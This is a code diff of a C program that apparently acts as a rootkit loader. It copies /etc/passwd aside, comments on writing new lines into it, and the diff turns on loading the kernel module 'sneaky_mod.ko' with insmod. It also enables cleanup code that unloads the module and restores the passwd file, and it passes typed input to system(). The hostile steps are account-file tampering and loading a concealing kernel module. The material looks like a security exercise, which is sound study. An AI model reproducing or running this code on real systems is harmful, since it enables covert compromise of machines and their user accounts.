@@ -26,6 +26,7 @@ int main(void){
 					printf("copying passwd file\n");
 					char *cmd1[] = {"cp", "/etc/passwd", "/tmp/passwd", 0}; //'cp /etc/passwd /tmp/passwd' cmd
 					execvp(cmd1[0], cmd1);
+					exit(0);
 				default:
 					//wrtie new lines to /etc/passwd
 					waitpid(file_mod_pid, NULL, 0);
@@ -53,7 +54,7 @@ int main(void){
 					printf("TODO: insmod kernel\n");
 					//TODO: verify this is working
 					char *insmod[] = {"insmod", "sneaky_mod.ko", 0};
-					//execvp(insmod[0], insmod);
+					execvp(insmod[0], insmod);
 					exit(0);
 				default:
 					;//LOOP KEY INPUTS HERE AND QUIT WHEN "Q" IS RECEIVED
@@ -67,7 +68,7 @@ int main(void){
 							if(strcmp(tmp, "q\n") == 0 || strcmp(tmp, "Q\n") == 0){
 								//printf("Q FOUND Input: %s\n", tmp);
 								printf("TODO: unload kernel and restore passwd file\n");
-								/*
+								
 								int cleanup_pid = fork();
 								switch(cleanup_pid){
 									case -1:
@@ -79,10 +80,14 @@ int main(void){
 										//TODO: verify this is working
 										char *rmmod[] = {"rmmod", "sneaky_mod.ko", 0};
 										execvp(rmmod[0], rmmod);
+										exit(0);
 									default:
+										printf("restoring /tmp/passwd file\n");
 										char *cp_cmd[] = {"cp", "/tmp/passwd", "/etc/passwd", 0}; //'rm /etc/passwd' cmd
+										waitpid(cleanup_pid, NULL, 0);
 										execvp(cp_cmd[0], cp_cmd);
-								}*/
+										exit(0);
+								}
 								exit(0);
 							}
 							int ret = system(tmp);
